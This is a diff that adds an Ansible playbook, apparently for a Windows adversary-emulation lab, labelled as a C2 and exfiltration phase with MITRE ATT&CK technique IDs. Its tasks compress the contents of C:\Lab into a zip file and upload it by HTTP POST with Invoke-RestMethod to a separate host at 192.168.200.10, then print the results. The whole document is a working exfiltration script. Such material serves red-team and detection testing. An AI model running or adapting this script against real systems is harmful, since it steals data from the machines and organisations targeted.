@@ -1,0 +1,39 @@
+- name: Phase 6 - C2 and Exfiltration
+  hosts: windows
+  gather_facts: no
+
+  tasks:
+    - name: Compress data (T1560)
+      win_shell: |
+        Compress-Archive -Path C:\Lab\* -DestinationPath C:\Lab\data.zip -Force
+      register: zip_output
+
+    - name: Exfiltrate data via HTTP (T1041)
+      win_shell: |
+        try {
+            Invoke-RestMethod -Uri http://192.168.200.10:8000/upload `
+              -Method POST `
+              -InFile C:\Lab\data.zip `
+              -ContentType "application/octet-stream"
+            Write-Output "Exfiltration success"
+        } catch {
+            Write-Output "Exfiltration failed"
+            Write-Output $_
+        }
+      register: exfil_output
+
+    - name: Show zip stdout
+      debug:
+        var: zip_output.stdout
+
+    - name: Show zip stderr
+      debug:
+        var: zip_output.stderr
+
+    - name: Show exfil stdout
+      debug:
+        var: exfil_output.stdout
+
+    - name: Show exfil stderr
+      debug:
+        var: exfil_output.stderr
